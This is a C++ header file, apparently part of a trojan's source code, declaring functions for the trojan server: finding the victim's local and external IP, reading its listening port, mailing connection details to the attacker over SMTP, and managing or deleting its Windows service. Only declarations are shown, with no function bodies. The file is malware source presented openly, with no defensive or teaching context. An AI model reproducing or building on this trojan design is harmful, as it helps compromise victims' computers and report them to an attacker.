//-------------------------------------------------------------
//					ServerFunctions.h
//-------------------------------------------------------------
#ifndef _SERVERFUNC_H
#define _SERVERFUNC_H

#include "Global.h"

//handles the smtp connection - sending an email
void SMTP_Handle(const char* serverName,const char* RcpAddrs,const string data,const string Sender,const int Port=25);

//Get Local Ip of the trojan server
bool getLocalIP(string &ip);

//Get Extern IP (if behind a NAT router)
bool getExternIP(string &ip);

//Reads the Port number which will the trojan server be listening on
bool GetTrojanPort(const string fileName,string &port);

//Reads the data needed for sending an email to the attacker (mail server,email address)
bool GetEmailData(const string fileName,string &mailServer,string &email);

//To Stop/Delete the service of the trojan server
bool DeleteWinService(const char* SrvName);

//Handler for the service
void WINAPI Handler( DWORD fdwControl );

#endif